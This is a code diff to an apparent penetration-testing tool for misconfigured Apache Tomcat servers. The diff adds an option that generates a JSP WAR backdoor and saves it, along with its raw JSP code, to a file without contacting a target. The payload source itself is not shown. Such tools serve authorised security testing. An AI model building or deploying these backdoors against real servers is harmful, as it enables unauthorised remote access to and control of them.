@@ -1017,7 +1017,7 @@ Penetration Testing utility aiming at presenting danger of leaving Tomcat miscon
 def main():
     (opts, args) = options()
 
-    if len(args) < 1:
+    if len(args) < 1 and not opts.generate:
         logging.error('One shall not go any further without an url!')
         return
 
@@ -1034,6 +1034,23 @@ def main():
 
     browser = None
     url = None
+
+    if opts.generate:
+        code = preparePayload(opts)
+        (dirpath, warpath) = generateWAR(
+            code, opts.title, opts.appname)
+
+        shutil.move(warpath, opts.generate)
+        logger.debug(
+            'Removing temporary WAR directory: "%s"' % dirpath)
+        shutil.rmtree(dirpath)
+        logging.info(
+            'JSP WAR backdoor has been generated and stored at: "%s"' % opts.generate)
+
+        with open(opts.generate + ".jsp", 'w') as f:
+            f.write(code)
+
+        return
 
     if not opts.generate:
         url = ''
@@ -1063,13 +1080,13 @@ def main():
                     "User has interrupted while browsing to Apache Manager.")
                 return
 
-    if browser == None or url == None:
-        logger.error('Service not found or could not authenticate to it.')
-        return
+        if browser == None or url == None:
+            logger.error('Service not found or could not authenticate to it.')
+            return
 
     try:
         appname = opts.appname
-        if not opts.remove_appname:
+        if not opts.remove_appname and not opts.generate:
             mode = chooseShellFunctionality(opts)
             if mode == 0:
                 logger.warning(
